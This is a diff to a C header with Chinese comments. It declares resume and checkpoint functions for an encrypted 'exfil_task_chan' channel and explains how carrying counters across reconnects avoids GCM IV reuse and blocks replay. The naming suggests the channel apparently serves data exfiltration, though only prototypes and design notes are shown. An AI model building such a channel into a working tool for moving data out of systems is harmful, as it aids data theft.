@@ -113,6 +113,37 @@ int exfil_task_chan_init(exfil_task_chan_t *ch,
 void exfil_task_chan_wipe(exfil_task_chan_t *ch);
 
 /*
+ * 重连恢复：用**保存下来的计数器**重建会话，而不是从 0 重启。
+ *
+ * ====================================================================
+ * 为什么必须有这个接口，而不是直接再调一次 chan_init
+ * ====================================================================
+ * 信元层 IV = pfx || counter，两端各自计数。同一会话（同一 ks/kr）
+ * 派生出的 pfx 是不变的。若重连后 counter 从 0 重启，就会产生
+ * **与断线前完全相同的 IV** —— GCM 的致命误用：两条密文异或即抵消
+ * 密钥流，直接泄露明文异或。
+ *
+ * 因此恢复必须带走并续用 counters 与 seq：
+ *   send_ctr / recv_ctr —— 下一个**将要使用**的计数值（不是已用数）
+ *   last_seq_down/up    —— 已接受的最大应用层 seq
+ *
+ * 本函数会拒绝 send_ctr/recv_ctr 的非法组合，并强制 recv_init=1，
+ * 使解包端从恢复点起严格递增 —— 断线前已收过的信元若被重放，
+ * 会因 IV 对不上而 AUTH 失败。
+ */
+int exfil_task_chan_resume(exfil_task_chan_t *ch,
+                           const uint8_t ks[16], const uint8_t kr[16],
+                           const uint8_t pfx[8],
+                           uint32_t send_ctr, uint32_t recv_ctr,
+                           uint64_t last_seq_down, uint64_t last_seq_up);
+
+/* 导出当前会话的恢复点（供缓存/落盘）。 */
+void exfil_task_chan_checkpoint(const exfil_task_chan_t *ch,
+                                uint32_t *send_ctr, uint32_t *recv_ctr,
+                                uint64_t *last_seq_down,
+                                uint64_t *last_seq_up);
+
+/*
  * 底层：把一个**已封好的帧层报文**装进恒长信元写入 fd，并推进发送计数。
  *
  * 供需要自行封包的高级调用方使用（例如测试要注入被篡改或用错密钥的
